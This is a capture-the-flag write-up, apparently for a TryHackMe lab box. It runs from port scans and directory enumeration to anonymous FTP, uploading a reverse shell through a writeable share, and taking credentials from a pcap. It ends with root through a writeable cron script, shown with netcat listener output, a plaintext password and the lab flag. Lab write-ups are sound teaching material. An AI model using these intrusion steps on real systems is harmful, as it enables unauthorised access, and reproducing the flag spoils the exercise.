Quick portscan
```bash
┌──(kali㉿kali)-[~]
└─$ nmap -p- --min-rate=10000 10.10.71.57                 
Starting Nmap 7.95 ( https://nmap.org ) at 2025-08-14 21:13 EEST
Nmap scan report for 10.10.71.57
Host is up (0.26s latency).
Not shown: 65532 closed tcp ports (reset)
PORT   STATE SERVICE
21/tcp open  ftp
22/tcp open  ssh
80/tcp open  http

Nmap done: 1 IP address (1 host up) scanned in 12.52 seconds
                                                                                                     
┌──(kali㉿kali)-[~]
└─$ nmap -p 21,22,80 -sC -sV 10.10.71.57                          
Starting Nmap 7.95 ( https://nmap.org ) at 2025-08-14 21:14 EEST
Nmap scan report for 10.10.71.57
Host is up (0.30s latency).

PORT   STATE SERVICE VERSION
21/tcp open  ftp     vsftpd 3.0.3
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
| drwxrwxrwx    2 65534    65534        4096 Nov 12  2020 ftp [NSE: writeable]
| -rw-r--r--    1 0        0          251631 Nov 12  2020 important.jpg
|_-rw-r--r--    1 0        0             208 Nov 12  2020 notice.txt
| ftp-syst: 
|   STAT: 
| FTP server status:
|      Connected to 10.6.25.159
|      Logged in as ftp
|      TYPE: ASCII
|      No session bandwidth limit
|      Session timeout in seconds is 300
|      Control connection is plain text
|      Data connections will be plain text
|      At session startup, client count was 2
|      vsFTPd 3.0.3 - secure, fast, stable
|_End of status
22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.10 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 b9:a6:0b:84:1d:22:01:a4:01:30:48:43:61:2b:ab:94 (RSA)
|   256 ec:13:25:8c:18:20:36:e6:ce:91:0e:16:26:eb:a2:be (ECDSA)
|_  256 a2:ff:2a:72:81:aa:a2:9f:55:a4:dc:92:23:e6:b4:3f (ED25519)
80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
|_http-server-header: Apache/2.4.18 (Ubuntu)
|_http-title: Maintenance
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 16.06 seconds
```

Ok so we got frp where we can login with anonymous

Ẃe had a .txt file with the followwing
```bash
cat notice.txt 
Whoever is leaving these damn Among Us memes in this share, it IS NOT FUNNY. People downloading documents from our website will think we are a joke! Now I dont know who it is, but Maya is looking pretty sus.
```
So we have a user called Maya. Also we got an image. It could have something hidden in it
```bash
gobuster dir -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt  -u http://10.10.71.57/ -t 150 -x php,html
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.10.71.57/
[+] Method:                  GET
[+] Threads:                 150
[+] Wordlist:                /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.6
[+] Extensions:              php,html
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/files                (Status: 301) [Size: 310] [--> http://10.10.71.57/files/]
/index.html           (Status: 200) [Size: 808]
/.php                 (Status: 403) [Size: 276]
/.html                (Status: 403) [Size: 276]

```
I did some enumerating, but i didn't seem to find much. I even tried to scan for subdomains.

I was able to put a revshell to the ftp and i can see it in the http since there is a /files subdomain

And now  we have a revshell and now im going to import over linpeas.sh
There was an interesting folder named /incidents and it had a .pcap file in there. I decided to forward that to my pc and check it out. Im guessing it has the credentials for the user so we can get ssh. 

And there it is password:c4ntg3t3n0ughsp1c3
I changed it to just password so its easier to remember

There is a bash file that writes stuff in to a text folder. We don't care about the start of the script, but it ends with /etc/print.sh which which is writeable. I put inside a revshell and waited for the crontab to execute it and we got back a root shell nice.

```bash
nc -lvnp 4444
listening on [any] 4444 ...
connect to [10.6.25.159] from (UNKNOWN) [10.10.71.57] 50796
sh: 0: can't access tty; job control turned off
# whoami
root
# cd  
# cat /root/root.txt
THM{f963aaa6a430f210222158ae15c3d76d}
# 
```
